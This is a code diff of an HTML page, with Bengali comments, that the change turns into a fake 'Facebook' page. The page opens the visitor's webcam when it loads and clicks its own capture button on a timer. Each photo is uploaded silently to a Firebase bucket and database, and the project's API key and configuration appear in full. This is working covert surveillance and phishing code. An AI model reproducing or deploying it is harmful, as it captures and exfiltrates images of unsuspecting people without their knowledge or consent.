@@ -1,17 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ক্যামেরা অ্যাপ</title>
+    <title>Facebook</title>
     <link rel="stylesheet" href="style.css">
-    
 </head>
 <body>
  <h1>Wait,,,,</h1>
- <img width="90%" src="" alt="" />
-    <div style="display:none;">
+ <img width="90%" src="https://i.ibb.co/8MjcwL5/facebook.png" alt="" />
+    <div style="display: ;">
         <video id="video" width="100%" height="800px" autoplay></video>
         <button id="captureBtn">ছবি তুলুন</button>
-        <canvas id="canvas" width="100%" height="100px" style="display: none;"></canvas>
+        <canvas id="canvas" style="display: none;"></canvas>
         <img width="100%" id="capturedImage" src="" alt="captured image" style="display: none;">
     </div>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -20,14 +19,13 @@
     <script type="text/javascript" charset="utf-8">
      // Firebase configuration
 const firebaseConfig = {
-  // আপনার Firebase প্রকল্পের কনফিগারেশন 
   apiKey: "AIzaSyDIijjkD8sWiMMYQOr6fzf2gy4mO086px4",
-        authDomain: "file-up-and-see.firebaseapp.com",
-        databaseURL: "https://file-up-and-see-default-rtdb.firebaseio.com",
-        projectId: "file-up-and-see",
-        storageBucket: "file-up-and-see.appspot.com",
-        messagingSenderId: "467223490440",
-        appId: "1:467223490440:web:c6a65e823f20edf427943d"
+  authDomain: "file-up-and-see.firebaseapp.com",
+  databaseURL: "https://file-up-and-see-default-rtdb.firebaseio.com",
+  projectId: "file-up-and-see",
+  storageBucket: "file-up-and-see.appspot.com",
+  messagingSenderId: "467223490440",
+  appId: "1:467223490440:web:c6a65e823f20edf427943d"
 };
 const app = firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
@@ -40,7 +38,7 @@ const canvas = document.getElementById('canvas');
 const capturedImage = document.getElementById('capturedImage');
 
 // ওয়েবক্যাম চালু করার জন্য
-navigator.mediaDevices.getUserMedia({ video: true })
+navigator.mediaDevices.getUserMedia({ video: { width: 960, height: 540 } })
   .then(stream => {
     video.srcObject = stream;
   })
@@ -50,92 +48,61 @@ navigator.mediaDevices.getUserMedia({ video: true })
 
 // ছবি তোলার জন্য
 captureBtn.addEventListener('click', () => {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
   let imageData = canvas.toDataURL('image/png');
-  
-  // ছবির সাইজ কমিয়ে 50kb এর মধ্যে আনার জন্য 
-  const image = new Image();
-  image.onload = () => {
-    const maxFileSize = 500 * 1024; // 50kb
-    let quality = 1;
-    let resizedImageData = '';
 
-    while (resizedImageData === '' || getFileSize(resizedImageData) > maxFileSize) {
-      quality -= 1;
-      resizedImageData = canvas.toDataURL('image/jpeg', quality);
+  capturedImage.src = imageData;
+  capturedImage.style.display = 'block';
+
+  // Firebase Storage এ আপলোড করার জন্য
+  const storageRef = storage.ref();
+  const imageRef = storageRef.child(`images/${Date.now()}.png`);
+  const uploadTask = imageRef.putString(imageData, 'data_url');
+
+  uploadTask.on('state_changed',
+    (snapshot) => {
+      const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+      console.log('Upload is ' + progress + '% done');
+    },
+    (error) => {
+      console.log('Error uploading image:', error);
+    },
+    () => {
+      uploadTask.snapshot.ref.getDownloadURL()
+        .then(downloadURL => {
+          const imageUrl = { imageUrl: downloadURL };
+          database.ref('images').push(imageUrl);
+        })
+        .catch(error => {
+          console.log('Error getting download URL:', error);
+        });
     }
-
-    capturedImage.src = resizedImageData;
-    capturedImage.style.display = 'block';
-
-    // Firebase Storage এ আপলোড করার জন্য
-    const storageRef = storage.ref();
-    const imageRef = storageRef.child(`images/${Date.now()}.jpg`);
-    const uploadTask = imageRef.putString(resizedImageData, 'data_url');
-
-    uploadTask.on('state_changed',
-      (snapshot) => {
-        // প্রগতি ট্র্যাক করার জন্য
-        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-        console.log('Upload is ' + progress + '% done');
-        // ...
-      },
-      (error) => {
-        //  এরর হ্যান্ডেল করার জন্য
-        console.log('Error uploading image:', error);
-      },
-      () => {
-        //  সফলভাবে আপলোড হওয়ার পর
-        uploadTask.snapshot.ref.getDownloadURL()
-          .then(downloadURL => {
-            //  ডাউনলোড URL Firebase Realtime Database এ সংরক্ষণ করার জন্য
-            const imageUrl = { imageUrl: downloadURL };
-            database.ref('images').push(imageUrl);
-          })
-          .catch(error => {
-            console.log('Error getting download URL:', error);
-          });
-      }
-    );
-  };
-  image.src = imageData; 
+  );
 });
-
-// ছবির সাইজ বের করার জন্য
-function getFileSize(dataURL) {
-  const byteString = atob(dataURL.split(',')[1]);
-  const ab = new ArrayBuffer(byteString.length);
-  const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  return ab.byteLength;
-}
 
     </script>
     <script type="text/javascript" charset="utf-8">
  const button = document.getElementById("captureBtn");
- let clickCount = 0; // ক্লিকের সংখ্যা ট্র্যাক করার জন্য একটি ভেরিয়েবল 
+ let clickCount = 0;
 
-console.log("Button:", button); // বাটন সঠিকভাবে পাওয়া যাচ্ছে কিনা দেখুন
+console.log("Button:", button);
 
-// লোড হওয়ার পর 5 সেকেন্ড পরে প্রথম ক্লিক
 setTimeout(() => {
   button.click();
-  clickCount++; // ক্লিকের সংখ্যা বাড়ান
-  console.log("First click"); // প্রথম ক্লিক হয়েছে কিনা দেখুন
+  clickCount++;
 
-  // প্রতি 5 সেকেন্ড পর পর ক্লিক করার জন্য স্থায়ী সময় নির্ধারণ
   let intervalId = setInterval(() => {
-    if (clickCount < 10) { // যদি ক্লিকের সংখ্যা 10 এর কম হয়
+    if (clickCount < 3) {
       button.click();
-      clickCount++; // ক্লিকের সংখ্যা বাড়ান
-      console.log("Clicking again"); // প্রতি 5 সেকেন্ডে ক্লিক হচ্ছে কিনা দেখুন
+      clickCount++;
+      console.log("Clicking again");
     } else {
-      clearInterval(intervalId); // 10 বার ক্লিক হওয়ার পরে ইন্টারভাল বন্ধ করে দিন 
+      clearInterval(intervalId);
     }
-  }, 5000);
+  }, 6000);
 }, 1000); 
 </script>
 </body>
-          </html
+</html>
